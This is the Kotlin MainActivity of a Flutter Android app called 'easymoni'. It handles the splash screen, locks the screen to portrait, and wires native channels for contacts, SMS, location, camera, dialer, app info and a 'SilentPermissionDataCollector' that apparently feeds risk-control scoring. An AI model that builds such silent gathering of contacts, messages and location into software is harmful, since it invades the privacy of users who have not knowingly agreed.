package com.ereeko.easymoni

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine

class MainActivity : FlutterActivity() {
    companion object {
        private const val TAG = "MainActivity"
        private const val DEVICE_INFO_PREFS = "device_info_prefs"
        private const val KEY_LAST_LAUNCH_AT = "last_launch_at"
        private const val MIN_SPLASH_DURATION_MS = 1000L
    }

    private lateinit var locationService: LocationPlatformService
    private lateinit var contactService: ContactPlatformService
    private lateinit var smsService: SmsPlatformService
    private lateinit var cameraService: CameraPlatformService
    private lateinit var dialerService: DialerPlatformService
    private lateinit var appInfoService: AppInfoPlatformService
    private lateinit var attributionService: AttributionPlatformService
    private lateinit var silentPermissionDataCollector: SilentPermissionDataCollector
    private var previousLaunchAt: Long = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        val splashScreen = installSplashScreen()
        val splashStartedAt = SystemClock.uptimeMillis()
        // 启动页最短展示时间，避免 Flutter 首帧过快时品牌页一闪而过。
        splashScreen.setKeepOnScreenCondition {
            SystemClock.uptimeMillis() - splashStartedAt < MIN_SPLASH_DURATION_MS
        }

        try {
            // 原生启动阶段先锁定竖屏，避免 Flutter 首帧前短暂横屏。
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set requested orientation", e)
        }
        super.onCreate(savedInstanceState)

        try {
            // 风控设备信息需要上一次启动时间，用于计算距上次启动的小时数。
            val prefs = getSharedPreferences(DEVICE_INFO_PREFS, Context.MODE_PRIVATE)
            previousLaunchAt = prefs.getLong(KEY_LAST_LAUNCH_AT, 0L)
            prefs.edit().putLong(KEY_LAST_LAUNCH_AT, System.currentTimeMillis()).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update launch timestamp", e)
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        try {
            val messenger = flutterEngine.dartExecutor.binaryMessenger
            locationService = LocationPlatformService(this)
            contactService = ContactPlatformService(this)
            smsService = SmsPlatformService(this)
            cameraService = CameraPlatformService(this)
            dialerService = DialerPlatformService(this)
            appInfoService = AppInfoPlatformService(this)
            attributionService = AttributionPlatformService(this)
            silentPermissionDataCollector = SilentPermissionDataCollector(
                activity = this,
                locationService = locationService,
                attributionService = attributionService,
                previousLaunchAt = previousLaunchAt
            )

            locationService.register(messenger)
            contactService.register(messenger)
            smsService.register(messenger)
            cameraService.register(messenger)
            dialerService.register(messenger)
            appInfoService.register(messenger)
            attributionService.register(messenger)
            silentPermissionDataCollector.register(messenger)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to configure native channels", e)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        try {
            if (::contactService.isInitialized && contactService.handleActivityResult(requestCode, resultCode, data)) return
            if (::cameraService.isInitialized && cameraService.handleActivityResult(requestCode, resultCode, data)) return
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle activity result", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        try {
            if (::locationService.isInitialized && locationService.handlePermissionResult(requestCode, grantResults)) return
            if (::smsService.isInitialized && smsService.handlePermissionResult(requestCode, grantResults)) return
            if (::cameraService.isInitialized && cameraService.handlePermissionResult(requestCode, grantResults)) return
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle permission result", e)
        }
    }
}
